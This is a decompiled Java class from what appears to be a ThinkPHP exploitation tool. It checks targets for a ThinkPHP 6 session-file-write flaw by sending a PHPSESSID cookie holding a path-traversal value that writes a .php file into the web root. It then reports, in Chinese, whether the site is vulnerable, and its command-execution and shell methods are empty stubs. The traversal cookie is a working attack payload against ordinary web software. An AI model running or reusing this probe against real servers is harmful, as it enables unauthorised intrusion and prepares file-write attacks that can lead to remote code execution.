/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import dylan.tools.Util;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ public class tp6_session_file_write
/*    */   implements BaseExp
/*    */ {
/* 15 */   private String results = null;
/* 16 */   private HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 20 */     String randstr = Util.getRandomString(7);
/* 21 */     url = url + "/" + randstr + ".php";
/* 22 */     this.property.put("Cookie", "PHPSESSID=../../../../public/" + randstr + ".php");
/* 23 */     Response response = HttpTool.get(url, this.property);
/* 24 */     if (response.getText().contains("a:1:{s:4:\"name\";s:8:\"thinkphp\";}")) {
/* 25 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 26 */       return this.results;
/*    */     } 
/* 28 */     if (response.getError() != null) {
/* 29 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 30 */       return this.results;
/*    */     } 
/* 32 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/* 33 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 38 */     return null;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/* 43 */     return null;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp6_session_file_write.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */